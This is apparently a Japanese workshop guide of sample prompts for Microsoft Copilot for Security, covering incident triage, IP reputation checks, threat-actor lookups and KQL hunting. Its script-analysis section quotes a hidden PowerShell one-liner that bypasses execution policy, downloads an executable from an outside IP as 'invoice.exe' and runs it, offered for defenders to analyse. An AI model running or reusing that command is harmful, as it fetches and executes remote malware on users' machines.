![Security CoPilot Logo](https://github.com/ninjyanaka/Copilot-For-Security/blob/main/Promptbook%20samples/ic_fluent_copilot_64_64%402x.png)
# Microsoft Copilot for Security Workshop

***
&nbsp;
## ハンズオンシナリオ➁ インシデント分析編

 ```
Microsoft Defender XDRから、優先すべき重大度の高いインシデントの上位5件を教えて
 ```
 ```
Defender XDR Incident 50 について教えて
 ```
 ```
Defender XDR Incident 50 に関連するエンティティについて教えて
 ```
 ```
MDTIを使用して、このIPアドレス 185.220.101.86 のレピュテーションスコアを教えて
 ```
 ```
VirusTotal を使用して、このIPアドレス 185.220.101.86 のレピュテーションスコアを教えて
 ```
 ```
調査結果をエグゼクティブ・レポートにまとめて
 ```

***
&nbsp;
## ハンズオンシナリオ➁　スクリプト分析編

 ```
以下のスクリプトは、どのような動作をするのか、順を追って説明し、その意図を推測してください
Script:powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://185.82.217.3/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'\\invoice.exe'
 ```

***
&nbsp;
## ハンズオンシナリオ➁　脅威インテリジェンス編

 ```
私はセキュリティエンジニアです。攻撃アクターグループ Volt Typhoon について教えて
 ```

***
&nbsp;
## ハンズオンシナリオ➂　Azure AI Search、ファイル
Azure AI Search
```
Azure AI Search プラグインを使用して、インシデントの対応手順を教えて
```

ファイル
```
ユーザー test04@MngEnvMCAP616855.onmicrosoft.comについて教えて
```
```
ファイル　危険なユーザー一覧を参照して、このユーザーが危険なのか教えて
```

***
&nbsp;
## ハンズオンシナリオ➂　アドバンスドハンティング　KQL

```
’Cobalt Strike’ のIOCに関連した通信を探して
```


